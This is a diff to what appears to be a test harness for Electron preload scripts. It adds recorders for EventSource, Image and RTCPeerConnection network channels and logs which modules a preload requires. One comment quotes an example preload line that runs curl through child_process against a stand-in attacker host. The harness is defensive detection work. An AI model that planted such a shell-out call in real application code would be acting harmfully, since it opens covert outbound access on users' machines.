@@ -167,14 +167,49 @@ try {
   };
 } catch { /* a frozen navigator cannot carry a beacon either */ }
 
+// THE REST OF THE RENDERER'S OUTBOUND SURFACE. Same reason as XHR and
+// sendBeacon above: these exist in a renderer and are `undefined` under plain
+// Node, so a preload using one threw into its own catch and the suite passed
+// without measuring anything. Each was verified to SURVIVE before being added.
+//
+//   EventSource        a GET that stays open — a channel, not just a ping
+//   Image().src        the oldest beacon there is; no fetch, no XHR involved
+//   RTCPeerConnection  a STUN/TURN url reaches the network during ICE setup
+globalThis.EventSource = function EventSource(url) {
+  networkCalls.push(['EventSource', String(url)]);
+  return { close() {}, addEventListener() {}, removeEventListener() {} };
+};
+globalThis.Image = function Image() {
+  const rec = {};
+  Object.defineProperty(rec, 'src', {
+    set(v) { networkCalls.push(['Image.src', String(v)]); },
+    get() { return ''; },
+  });
+  return rec;
+};
+globalThis.RTCPeerConnection = function RTCPeerConnection(config) {
+  for (const s of (config && config.iceServers) || []) {
+    for (const u of [].concat(s.urls || s.url || [])) {
+      networkCalls.push(['RTCPeerConnection', String(u)]);
+    }
+  }
+  return {
+    createDataChannel: () => ({ send() {}, close() {} }),
+    createOffer: async () => ({}),
+    setLocalDescription: async () => {},
+    close() {}, addEventListener() {}, removeEventListener() {},
+  };
+};
+
 // Which doors are actually live, PROBED rather than listed. A hardcoded list
 // would still say "sendBeacon" after a frozen navigator silently dropped it —
 // the control in the test would then be checking my intent, not the harness.
 const outboundDoors = () => {
   const doors = [];
-  if (typeof globalThis.fetch === 'function') doors.push('fetch');
-  if (typeof globalThis.XMLHttpRequest === 'function') doors.push('XMLHttpRequest');
-  if (typeof globalThis.WebSocket === 'function') doors.push('WebSocket');
+  for (const n of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'Image',
+    'RTCPeerConnection']) {
+    if (typeof globalThis[n] === 'function') doors.push(n);
+  }
   if (typeof globalThis.navigator?.sendBeacon === 'function') doors.push('sendBeacon');
   if (typeof globalThis[CANARY_DOOR] === 'function') doors.push(CANARY_DOOR);
   return doors;
@@ -226,8 +261,16 @@ if (mode === 'bridge') {
   // the page without contextBridge at all. Snapshot the globals, then diff.
   const globalsBefore = new Set(Reflect.ownKeys(globalThis));
 
+  // WHAT THE PRELOAD REQUIRES. This hook already saw every require and threw
+  // the information away — only electron-main.cjs's requires were recorded
+  // (the filter ~700 lines down is `parent.filename === mainCjs`). So
+  // `require('child_process').exec('curl https://evil.example')` in the
+  // preload was invisible to all 437 checks: child_process is real under Node,
+  // unlike the renderer-only APIs above, so the call actually ran.
+  const preloadRequires = [];
   const originalLoad = Module._load;
   Module._load = function (request, parent, isMain) {
+    preloadRequires.push(String(request));
     if (request === 'electron') return { contextBridge, ipcRenderer };
     return originalLoad.call(this, request, parent, isMain);
   };
@@ -255,6 +298,17 @@ if (mode === 'bridge') {
     const b3 = networkCalls.length;
     try { globalThis.navigator.sendBeacon('https://selftest.invalid/b', 'd'); } catch { /* ditto */ }
     selfTest.sendBeacon = networkCalls.length > b3;
+    const b5 = networkCalls.length;
+    try { new globalThis.EventSource('https://selftest.invalid/e'); } catch { /* ditto */ }
+    selfTest.EventSource = networkCalls.length > b5;
+    const b6 = networkCalls.length;
+    try { (new globalThis.Image()).src = 'https://selftest.invalid/i'; } catch { /* ditto */ }
+    selfTest.Image = networkCalls.length > b6;
+    const b7 = networkCalls.length;
+    try {
+      new globalThis.RTCPeerConnection({ iceServers: [{ urls: 'stun:selftest.invalid' }] });
+    } catch { /* ditto */ }
+    selfTest.RTCPeerConnection = networkCalls.length > b7;
     const b4 = scheduledTimers.length;
     realClearTimeout(globalThis.setTimeout(() => {}, 60000));
     selfTest.timerCensus = scheduledTimers.length > b4;
@@ -495,6 +549,10 @@ if (mode === 'bridge') {
       outboundDoors: doorsOfferedToPreload,
       // Proof the recorders above actually record; see the self-test block.
       recorderSelfTest: selfTest,
+      // Includes the preload's own entry path, which the test filters out —
+      // and that path is the canary: a hardcoded ['electron'] arrives without
+      // it, so the list must be the one Module._load actually built.
+      preloadRequires: [...new Set(preloadRequires)],
       drained: true });
   }, 60);
 }
